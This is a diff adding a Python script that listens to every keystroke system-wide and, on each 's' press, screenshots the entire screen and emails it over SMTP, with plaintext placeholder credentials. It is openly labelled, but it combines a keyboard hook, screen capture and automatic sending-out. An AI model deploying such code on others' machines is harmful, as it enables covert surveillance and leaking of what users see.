@@ -1,0 +1,60 @@
+import smtplib
+import os
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from pynput import keyboard
+from PIL import ImageGrab
+import threading
+
+# Email configuration
+EMAIL_ADDRESS = 'your_email@example.com'
+EMAIL_PASSWORD = 'your_email_password'
+RECIPIENT_ADDRESS = 'recipient@example.com'
+SMTP_SERVER = 'smtp.example.com'
+SMTP_PORT = 587
+
+# Function to send an email with the screenshot
+def send_email_with_screenshot(screenshot_path):
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = RECIPIENT_ADDRESS
+    msg['Subject'] = 'Screenshot Captured'
+
+    body = 'Attached is the screenshot you captured.'
+    msg.attach(MIMEText(body, 'plain'))
+
+    attachment = open(screenshot_path, 'rb')
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload(attachment.read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(screenshot_path)}')
+    msg.attach(part)
+
+    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+    server.starttls()
+    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+    text = msg.as_string()
+    server.sendmail(EMAIL_ADDRESS, RECIPIENT_ADDRESS, text)
+    server.quit()
+
+# Function to capture a screenshot
+def capture_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
+    screenshot.save(screenshot_path)
+    send_email_with_screenshot(screenshot_path)
+    print('Screenshot captured and email sent.')
+
+# Function to handle key press events
+def on_press(key):
+    try:
+        if key.char == 's':  # Press 's' to capture and send screenshot
+            threading.Thread(target=capture_screenshot).start()
+    except AttributeError:
+        pass
+
+# Start the keyboard listener
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
